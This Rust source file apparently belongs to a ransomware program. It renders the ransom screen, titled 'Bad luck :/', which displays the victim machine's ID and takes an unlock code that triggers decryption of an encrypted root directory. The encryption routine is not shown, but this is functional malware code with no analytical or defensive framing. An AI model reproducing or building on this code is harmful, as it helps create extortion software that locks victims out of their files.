use std::panic;

use serde::Deserialize;
use uuid::Uuid;
use web_view::*;

use crate::{Action, perform_action_on_directory};

pub fn render_ui(machine_id: &Uuid, encrypted_root_dir: &str) {
    let html_content = include_str!("../assets/ui.html");

    web_view::builder()
        .title("Bad luck :/")
        .content(Content::Html(html_content))
        .size(480, 400)
        .resizable(true)
        .debug(true)
        .user_data(())
        .invoke_handler(|webview, arg| {
            use ClientCommand::*;

            match serde_json::from_str(arg).unwrap() {
                Init => webview.eval(&format!("renderMachineInfo('{}')", machine_id)),
                Unlock { code } => {
                    let results = panic::catch_unwind(|| {
                        perform_action_on_directory(&code, &Action::Decrypt, encrypted_root_dir).unwrap();
                    });

                    match results {
                        Ok(()) => webview.eval(&format!("showUnlockResults('{}')", "Done!")),
                        Err(_err) => webview.eval(&format!("showUnlockResults('{}')", "No >:(")),
                    }
                }
            }
        })
        .run()
        .unwrap();
}

#[derive(Deserialize)]
#[serde(tag = "cmd", rename_all = "camelCase")]
enum ClientCommand {
    Init,
    Unlock { code: String },
}